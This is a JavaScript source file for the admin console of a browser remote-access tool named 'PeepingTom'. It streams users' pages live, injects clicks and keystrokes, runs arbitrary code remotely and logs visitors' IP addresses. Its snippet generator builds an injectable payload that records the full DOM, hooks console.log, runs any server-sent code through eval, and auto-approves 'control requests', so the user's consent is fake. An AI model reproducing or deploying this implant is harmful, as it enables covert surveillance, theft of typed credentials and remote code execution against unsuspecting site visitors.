const socket = io();
let replayer = null;
let hasControl = false;
let eventsBuffer = [];
let currentTargetId = null;

const telemetryTerminal = document.getElementById('telemetry-terminal');
const consoleTerminal = document.getElementById('console-terminal');
const overlay = document.getElementById('interactive-overlay');
const btnRequest = document.getElementById('btn-request');
const btnCopy = document.getElementById('btn-copy');
const statusBadge = document.querySelector('.status-badge');
const inpServerUrl = document.getElementById('inp-server-url');
const sessionList = document.getElementById('session-list');
const mirrorContainer = document.getElementById('mirror-container');

inpServerUrl.value = window.location.origin;

// --- LOGGING FUNCTIONS ---
function logSys(msg, type = 'normal') {
    const time = new Date().toLocaleTimeString('en-US', { hour12: false });
    let msgClass = '';
    if (type === 'highlight') msgClass = 'log-highlight';
    if (type === 'danger') msgClass = 'log-danger';
    telemetryTerminal.innerHTML += `<div class="log-entry"><span class="log-time">[${time}]</span> <span class="${msgClass}">${msg}</span></div>`;
    telemetryTerminal.scrollTop = telemetryTerminal.scrollHeight;
}

function logCmd(msg, type = 'normal') {
    let msgClass = '';
    if (type === 'highlight') msgClass = 'log-highlight';
    if (type === 'danger') msgClass = 'log-danger';
    consoleTerminal.innerHTML += `<div class="log-entry"><span class="${msgClass}">${msg}</span></div>`;
    consoleTerminal.scrollTop = consoleTerminal.scrollHeight;
}

// --- FULLSCREEN LOGIC ---
function toggleFullscreen() {
    document.body.classList.toggle('fullscreen-mode');
    const btn = document.getElementById('btn-fullscreen');
    if (document.body.classList.contains('fullscreen-mode')) {
        btn.innerText = "✖ Exit Fullscreen";
        logSys("Entered fullscreen operator mode.");
    } else {
        btn.innerText = "⛶ Fullscreen";
    }
}

// --- ADMIN DEBUGGING ---
socket.on('connect', () => {
    console.log('👑 [Admin] Connected to server. Socket ID:', socket.id);
    socket.emit('register-admin');
});

// Render User List & Auto-Connect
socket.on('active-clients-list', (clients) => {
    sessionList.innerHTML = '';

    if (clients.length === 0) {
        sessionList.innerHTML = '<li style="padding:10px; font-size:0.8rem; color:#71717a; text-align:center;">No users connected</li>';
        currentTargetId = null;
        return;
    }

    clients.forEach(client => {
        const li = document.createElement('li');
        li.className = 'session-item' + (currentTargetId === client.id ? ' active-session' : '');

        try {
            const domain = new URL(client.origin).hostname;
            li.innerText = `Connected From ${domain} > ${client.id.substring(0, 6)}...`;
        } catch {
            li.innerText = `Client > ${client.id.substring(0, 6)}...`;
        }

        li.onclick = () => watchUser(client);
        sessionList.appendChild(li);
    });

    if (!currentTargetId && clients.length > 0) {
        watchUser(clients[0]);
    }
});

function watchUser(client) {
    currentTargetId = client.id;
    socket.emit('watch-client', client.id);

    document.getElementById('d-browser').innerText = client.browser || 'Unknown';
    document.getElementById('d-os').innerText = client.os || 'Unknown';
    document.getElementById('d-origin').innerText = client.origin || 'Unknown';

    logSys(`Linking to target stream: ${client.id}...`, 'highlight');

    if (replayer) {
        mirrorContainer.innerHTML = '';
        replayer = null;
    }
    eventsBuffer = [];
    consoleTerminal.innerHTML = ''; // Clear JS Console on switch
    hasControl = false;
    btnRequest.disabled = false;
    btnRequest.innerText = "Take Control";
    btnRequest.classList.remove('btn-active');
    overlay.style.display = 'none';
    statusBadge.innerHTML = "Syncing Stream...";

    socket.emit('register-admin');
}

// Process Incoming DOM Events
socket.on('replay-event', (event) => {
    if (!replayer && event.type === 4) {
        eventsBuffer = [];
    }

    if (replayer) {
        try { replayer.addEvent(event); }
        catch (err) { console.error("👑 [Admin Stream] Error adding event:", err); }
        return;
    }

    eventsBuffer.push(event);

    if (event.type === 2) {
        logSys("Data stream synchronized securely.", 'highlight');
        statusBadge.innerHTML = "Link Established";

        try {
            replayer = new rrweb.Replayer(eventsBuffer, {
                root: mirrorContainer,
                liveMode: true
            });

            setTimeout(() => { replayer.startLive(); }, 100);
        } catch (error) {
            logSys("Stream parsing error. Retrying...", "danger");
            eventsBuffer = []; replayer = null;
        }
    }
});

// Request / Revoke Control
function toggleControl() {
    if (!currentTargetId) return alert("Please select a session first.");

    if (hasControl) {
        logSys("Control relinquished. Returning to passive monitoring.");
        hasControl = false;
        btnRequest.innerText = "Take Control";
        btnRequest.classList.remove('btn-active');
        overlay.style.display = 'none';
        overlay.style.pointerEvents = 'none'; // Disable clicking when just watching
    } else {
        logSys("Transmitting control override request...", 'highlight');
        btnRequest.innerText = "Awaiting Authorization...";
        btnRequest.disabled = true;
        socket.emit('request-control', currentTargetId);
    }
}

socket.on('control-approved', () => {
    logSys("Access modification APPROVED by client user.", 'danger');
    hasControl = true;
    btnRequest.disabled = false;
    btnRequest.innerText = "Terminate Control Session";
    btnRequest.classList.add('btn-active');
    overlay.style.display = 'block';
    overlay.style.border = '2px solid var(--accent-danger)';
    overlay.style.pointerEvents = 'auto'; // Re-enable clicking when in control
    overlay.tabIndex = 0;
    overlay.focus();
});

socket.on('control-denied', () => {
    logSys("Access modification DENIED by client user.");
    btnRequest.innerText = "Request Control";
    btnRequest.disabled = false;
});

// Interaction Handling
overlay.addEventListener('click', (e) => {
    if (!hasControl || !replayer || !replayer.iframe || !currentTargetId) return;
    const iframeRect = replayer.iframe.getBoundingClientRect();
    if (e.clientX < iframeRect.left || e.clientX > iframeRect.right || e.clientY < iframeRect.top || e.clientY > iframeRect.bottom) return;

    const percentX = (e.clientX - iframeRect.left) / iframeRect.width;
    const percentY = (e.clientY - iframeRect.top) / iframeRect.height;
    socket.emit('operator-action', { targetClientId: currentTargetId, action: 'click', px: percentX, py: percentY });
    overlay.focus();
});

overlay.addEventListener('keydown', (e) => {
    if (!hasControl || !currentTargetId) return;
    if(e.key.length === 1 || e.key === 'Backspace') {
        e.preventDefault();
        socket.emit('operator-action', { targetClientId: currentTargetId, action: 'keydown', key: e.key });
    }
});

// --- REMOTE JS CONSOLE LOGIC ---
const cmdInput = document.getElementById('cmd-input');

cmdInput.addEventListener('keydown', (e) => {
    if (e.key === 'Enter') {
        const code = cmdInput.value.trim();
        if (!code) return;
        
        if (!currentTargetId) {
            logSys("Cannot execute: No target session selected.", "danger");
            return;
        }

        logCmd(`&gt; ${code}`);
        socket.emit('admin-execute-js', { targetClientId: currentTargetId, code: code });
        cmdInput.value = ''; 
    }
});

socket.on('admin-js-result', (data) => {
    if (data.clientId === currentTargetId) {
        if (data.type === 'error') {
            logCmd(`&lt; Error: ${data.data}`, 'danger');
        } else if (data.type === 'log') {
            logCmd(`&lt; [Console] ${data.data}`, 'highlight');
        } else {
            logCmd(`&lt; ${data.data}`);
        }
    }
});

// --- JS MODULE DEPLOYMENT LOGIC ---
const moduleUpload = document.getElementById('module-upload');

moduleUpload.addEventListener('change', (e) => {
    const file = e.target.files[0];
    if (!file) return; 

    if (!currentTargetId) {
        logSys("Cannot deploy module: No target session selected.", "danger");
        moduleUpload.value = ''; 
        return;
    }

    const reader = new FileReader();
    reader.onload = function(event) {
        const fileContent = event.target.result;
        logCmd(`Deploying module: ${file.name}...`, 'highlight');
        socket.emit('admin-execute-js', { targetClientId: currentTargetId, code: fileContent });
        moduleUpload.value = ''; 
    };
    
    reader.onerror = function() {
        logSys(`Failed to read file: ${file.name}`, 'danger');
        moduleUpload.value = '';
    };

    reader.readAsText(file);
});

// --- HISTORY MODAL FUNCTIONS ---
function openHistory() {
    document.getElementById('history-modal').style.display = 'flex';
    logSys("Querying database for connection logs...", "highlight");
    socket.emit('request-history');
}

socket.on('history-data', (rows) => {
    const tbody = document.getElementById('history-table-body');
    tbody.innerHTML = '';
    
    if(rows.length === 0) {
        tbody.innerHTML = '<tr><td colspan="5" style="text-align:center;">No history records found.</td></tr>';
        return;
    }

    rows.forEach(row => {
        const tr = document.createElement('tr');
        let dateStr = "Unknown";
        try {
            const date = new Date(row.connected_at + 'Z'); 
            dateStr = date.toLocaleString();
        } catch(e) {}

        tr.innerHTML = `
            <td>${dateStr}</td>
            <td>${row.ip_address || 'Unknown'}</td>
            <td>${row.origin || 'Unknown'}</td>
            <td>${row.os || 'Unknown'}</td>
            <td>${row.browser || 'Unknown'}</td>
        `;
        tbody.appendChild(tr);
    });
});

// --- SNIPPET GENERATOR ---
function copyJsSnippet() {
    const serverURL = inpServerUrl.value.trim() || "http://localhost:3000";

    const payload = `(function() {
console.log('[PeepingTom] Initialization started. Target Server: ${serverURL}');

function loadScript(src, callback) {
var s = document.createElement('script'); s.src = src; s.onload = () => { console.log('[PeepingTom] Loaded script: ' + src); callback(); }; s.onerror = (err) => console.error('[PeepingTom] Failed to load script: ' + src, err); document.head.appendChild(s);
}

loadScript('https://cdn.socket.io/4.7.2/socket.io.min.js', function() {
loadScript('https://cdn.jsdelivr.net/npm/rrweb@1.1.3/dist/rrweb.min.js', function() {
    console.log('[PeepingTom] Dependencies loaded. Attempting WebSocket connection...');
    const socket = io('${serverURL}', { transports: ['websocket'] });
    
    let isControlGranted = true; 
    let recordStopFn = null;

    socket.on('connect_error', (err) => console.error('[PeepingTom] Socket.IO Error:', err.message));

    function parseUserEnv() {
        var ua = navigator.userAgent, b = "Unknown Browser", os = "Unknown OS";
        if (/chrome|crios/i.test(ua) && !/edge|edg/i.test(ua)) b = "Chrome"; else if (/safari/i.test(ua) && !/chrome|crios/i.test(ua)) b = "Safari"; else if (/firefox|fxios/i.test(ua)) b = "Firefox"; else if (/edge|edg/i.test(ua)) b = "Edge";
        if (/windows/i.test(ua)) os = "Windows NT"; else if (/macintosh|mac os x/i.test(ua)) os = "macOS"; else if (/linux/i.test(ua)) os = "Linux"; else if (/iphone|ipad/i.test(ua)) os = "iOS"; else if (/android/i.test(ua)) os = "Android";
        return { browser: b, os: os, origin: window.location.origin };
    }

    socket.on('connect', () => {
        console.log('[PeepingTom] Connected to server successfully! Socket ID:', socket.id);
        socket.emit('register-specs', parseUserEnv());
    });

    function startCapture() {
        if (recordStopFn) recordStopFn();
        recordStopFn = rrweb.record({ emit(event) { socket.emit('record-event', event); } });
    }

    startCapture();

    socket.on('request-snapshot', () => {
        console.log('[PeepingTom] Admin requested a fresh snapshot. Restarting capture...');
        startCapture();
    });

    const originalConsoleLog = console.log;
    console.log = function(...args) {
        originalConsoleLog.apply(console, args); 
        if (!args[0] || (typeof args[0] === 'string' && !args[0].startsWith('[PeepingTom]'))) {
            socket.emit('client-js-result', { type: 'log', data: args.join(' '), clientId: socket.id });
        }
    };

    socket.on('execute-js', (code) => {
        let result;
        try {
            result = eval(code);
            if (result !== undefined) {
                socket.emit('client-js-result', { type: 'result', data: String(result), clientId: socket.id });
            }
        } catch (error) {
            socket.emit('client-js-result', { type: 'error', data: error.toString(), clientId: socket.id });
        }
    });

    socket.on('control-requested', () => {
        console.log('[PeepingTom] 🚨 CONTROL REQUEST RECEIVED FROM ADMIN! (Auto-approved for QA)');
        isControlGranted = true;
        socket.emit('control-approved');
    });

    socket.on('execute-action', (data) => {
        if (!isControlGranted) return;
        if (data.action === 'click') {
            const x = window.innerWidth * data.px; const y = window.innerHeight * data.py; const targetEl = document.elementFromPoint(x, y); if (targetEl) { targetEl.click(); targetEl.focus(); }
        }
        if (data.action === 'keydown') {
            const activeEl = document.activeElement;
            if (activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA')) {
                if (data.key === 'Backspace') { activeEl.value = activeEl.value.slice(0, -1); } else if (data.key.length === 1) { activeEl.value += data.key; }
                activeEl.dispatchEvent(new Event('input', { bubbles: true })); activeEl.dispatchEvent(new Event('change', { bubbles: true }));
            }
        }
    });
});
});
})();`;

    navigator.clipboard.writeText(payload).then(() => {
        const originalText = btnCopy.innerText;
        btnCopy.innerText = "✓ Snippet Copied!"; btnCopy.style.color = "var(--accent-yellow)";
        setTimeout(() => { btnCopy.innerText = originalText; btnCopy.style.color = "var(--text-main)"; }, 2000);
    });
}
